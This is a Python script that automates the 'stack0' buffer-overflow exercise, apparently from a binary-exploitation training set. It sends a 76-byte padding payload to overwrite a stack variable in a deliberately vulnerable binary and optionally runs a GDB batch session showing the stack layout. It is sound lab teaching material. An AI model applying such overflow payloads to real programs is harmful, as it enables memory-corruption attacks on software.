#!/usr/bin/env python3
"""
stack0 automation helper

Runs the minimal overflow payload to flip `modified` and optionally runs a
non-interactive GDB session to show addresses and stack bytes.

Designed to work without GEF/pwndbg.
"""
import argparse
import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path


SUCCESS_LINE = "you have changed the 'modified' variable"


def repo_relative(path: str) -> Path:
    return (Path(__file__).resolve().parent / path).resolve()


def ensure_executable(p: Path) -> None:
    st = p.stat()
    if st.st_mode & stat.S_IXUSR:
        return
    p.chmod(st.st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)


def _run_capture(argv, stdin_bytes):
    """
    Python 3.4 compatible subprocess helper (no subprocess.run()).
    Returns (returncode, combined_output_str).
    """
    p = subprocess.Popen(
        argv,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out, _ = p.communicate(stdin_bytes)
    try:
        out_s = out.decode("utf-8", "replace")
    except Exception:
        # Very old/odd locales: still return something readable.
        out_s = str(out)
    return p.returncode, out_s


def run_stack0(binary: Path, payload: bytes):
    return _run_capture([str(binary)], payload)


def solve_payload() -> bytes:
    # From stack.0.md:
    # buffer @ rbp-0x50, modified @ rbp-0x4 => 0x4c = 76 bytes
    return b"A" * 76 + b"B" + b"\n"


def gdb_batch(binary: Path) -> str:
    # Keep it resilient: avoid GEF-only commands.
    # We break after gets@plt call (main+0x22 from objdump) to inspect memory.
    return "\n".join(
        [
            "set pagination off",
            "set confirm off",
            "set disassembly-flavor intel",
            "file " + str(binary),
            "break main",
            "run",
            "printf \"\\n[+] &buffer  = %p\\n\", &buffer",
            "printf \"[+] &modified= %p\\n\", &modified",
            "printf \"[+] (difference) = %ld bytes\\n\", (char*)&modified - (char*)&buffer",
            "break *main+0x22",
            "continue",
            "printf \"\\n[+] After gets()\\n\"",
            "info registers rbp rsp",
            "x/wx $rbp-0x4",
            "x/80bx $rbp-0x60",
            "quit",
            "",
        ]
    )


def run_gdb(binary: Path, payload: bytes):
    script = gdb_batch(binary)
    # gdb's -ex does not accept multi-command blocks reliably across versions,
    # so write a temporary script file and use -x.
    with tempfile.NamedTemporaryFile("w", prefix="stack0-gdb-", suffix=".gdb", delete=False) as f:
        f.write(script)
        script_path = f.name
    try:
        return _run_capture(["gdb", "-q", "-nx", "-batch", "-x", script_path], payload)
    finally:
        try:
            os.unlink(script_path)
        except OSError:
            pass


def main():
    ap = argparse.ArgumentParser(description="Automate stack0 analysis + solve.")
    ap.add_argument("--binary", default="stack0", help="Path to stack0 binary (default: ./stack0)")
    ap.add_argument("--no-gdb", action="store_true", help="Skip the GDB batch analysis")
    args = ap.parse_args()

    binary = Path(args.binary)
    if not binary.is_absolute():
        binary = repo_relative(binary.as_posix())

    if not binary.exists():
        sys.stderr.write("ERROR: binary not found: {0}\n".format(binary))
        return 2

    ensure_executable(binary)

    payload = solve_payload()

    print("[+] Running: {0} with payload len={1} (+ newline)".format(binary.name, len(payload) - 1))
    rc, out = run_stack0(binary, payload)
    sys.stdout.write(out)
    if not out.endswith("\n"):
        sys.stdout.write("\n")

    if SUCCESS_LINE not in out:
        print("[!] Did not observe success message.", file=sys.stderr)
        print("[!] If this is a different build, re-check the offset in GDB.", file=sys.stderr)
        return 1

    print("[+] Success: modified flipped.")

    if args.no_gdb:
        return 0

    if not shutil_which("gdb"):
        print("[!] gdb not found; skipping GDB batch. Install with: sudo apt-get install -y gdb")
        return 0

    print("\n[+] Running non-interactive GDB batch (feeds same payload).")
    gdb_rc, gdb_out = run_gdb(binary, payload)
    sys.stdout.write(gdb_out)
    if not gdb_out.endswith("\n"):
        sys.stdout.write("\n")
    if gdb_rc != 0:
        sys.stderr.write("[!] GDB exited non-zero: {0}\n".format(gdb_rc))
    return 0


def shutil_which(cmd):
    # Minimal `which` to avoid importing shutil in older environments.
    paths = os.environ.get("PATH", "").split(os.pathsep)
    for d in paths:
        p = str(Path(d) / cmd)
        if os.path.exists(p) and os.access(p, os.X_OK):
            return p
    return None


if __name__ == "__main__":
    raise SystemExit(main())

